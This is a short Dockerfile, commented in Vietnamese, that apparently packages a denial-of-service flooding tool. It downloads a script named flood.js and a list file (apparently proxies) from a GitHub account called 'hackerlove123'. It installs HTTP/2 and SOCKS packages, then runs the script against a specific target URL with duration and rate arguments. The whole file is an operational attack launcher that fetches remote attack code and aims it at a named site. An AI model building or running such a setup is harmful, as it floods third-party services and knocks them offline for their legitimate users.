FROM node:alpine

# Cài đặt git và curl
RUN apk add --no-cache git curl

# Tạo thư mục làm việc
WORKDIR /RunScriptDocker

# Tải xuống các file cần thiết từ GitHub
RUN curl -L -o flood.js https://raw.githubusercontent.com/hackerlove123/RunScriptDocker/main/flood.js && \
    curl -L -o live.txt https://raw.githubusercontent.com/hackerlove123/RunScriptDocker/main/live.txt

# Kiểm tra danh sách file trong thư mục
RUN ls -la

# Cài đặt các gói npm trực tiếp trong thư mục làm việc
RUN npm install hpack https commander colors socks set-cookie-parser

# Kiểm tra phiên bản node và npm
RUN node -v && npm -v

# Chạy script khi container khởi động và giữ container chạy
RUN node flood.js https://countbot.lol/7371969470-e4644541-a352-48dd-97be-185e93e08c08 120 10 10 live.txt flood && tail -f /dev/null
